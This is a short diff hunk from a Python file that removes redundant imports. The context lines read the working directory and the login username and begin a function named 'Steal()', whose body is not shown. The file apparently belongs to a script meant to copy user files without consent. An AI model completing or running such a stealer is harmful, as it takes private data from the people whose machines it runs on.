@@ -1,7 +1,5 @@
 import shutil
 import os
-import os
-import sys
 dwc = os.getcwd()
 username = os.getlogin()
 def Steal():
